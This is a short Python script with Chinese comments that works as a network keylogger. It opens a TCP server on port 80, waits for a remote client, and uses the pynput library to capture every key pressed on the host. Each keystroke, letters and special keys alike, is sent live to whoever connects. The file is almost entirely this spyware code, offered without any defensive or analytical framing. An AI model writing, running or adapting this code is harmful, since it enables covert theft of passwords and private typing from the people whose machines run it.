# -*- coding: UTF-8 -*-

import socket
import sys
import os
from pynput.keyboard import Listener


class server:
    def __init__(self, ip, port):
        self.port = port
        self.ip = ip
        self.bufferSize = 10240

    def start(self):  # 启动监听，接收数据
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.bind((self.ip, self.port))  # 绑定
            s.listen(10)  # 监听
            print('等待客户端连接')
            while True:  # 一直等待新的连接
                try:
                    conn, addr = s.accept()  # 接收连接
                    print('客户端连接 ' + addr[0] + ':' + str(addr[1]))
                    while True:  # 不知道客户端发送数据大小，循环接收ddd
                        self.keybroad_listener(conn)
                    conn.close()
                except socket.error as e:
                    print(e)
                    conn.close()  # 关闭连接
        finally:
            s.close()  # 关闭服务端


    def keybroad_listener(self,tcpCliSock):
        self.tcpCliSock=tcpCliSock
        with Listener(on_press=self.on_press) as listener:
                listener.join()

    def on_press(self,key):
        try:
            self.tcpCliSock.send(('按下字母数字键：{0}'.format(key.char).encode('utf-8')))
            #print('按下字母数字键：{0}'.format(key.char))
        except:
            self.tcpCliSock.send(('按下特殊键：{0}'.format(key).encode('utf-8')))
            #print('按下特殊键：{0}'.format(key))

if __name__ == '__main__':
    s = server('', 80)
    s.start()
